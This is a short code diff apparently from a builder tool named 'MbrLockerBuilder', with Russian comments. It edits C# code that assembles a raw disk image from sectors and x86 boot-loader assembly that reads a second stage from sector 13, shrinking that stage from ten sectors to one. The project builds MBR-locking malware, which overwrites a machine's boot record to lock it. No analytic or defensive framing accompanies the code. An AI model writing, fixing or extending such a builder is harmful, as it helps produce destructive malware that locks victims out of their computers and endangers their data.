@@ -490,8 +490,8 @@ namespace MbrLockerBuilder
                 if (bodyBytes.Length > 512) Array.Resize(ref bodyBytes, 512);
                 Array.Copy(bodyBytes, 0, fullImage, 512 * 12, bodyBytes.Length);
 
-                // 5. Stage2 (сектора 13-22) — 10 секторов
-                Array.Copy(stage2Bytes, 0, fullImage, 512 * 13, Math.Min(stage2Bytes.Length, 512 * 10));
+                // 5. Stage2 (сектор 13) — 1 сектор
+                Array.Copy(stage2Bytes, 0, fullImage, 512 * 13, Math.Min(stage2Bytes.Length, 512));
 
                 this.lblStatus.Text = "5/7 Получение template.exe...";
                 Application.DoEvents();
@@ -627,7 +627,7 @@ start:
     mov es, ax
     mov bx, 0x8000
     mov ah, 0x02
-    mov al, 10
+    mov al, 1
     mov ch, 0
     mov cl, 13
     mov dh, 0
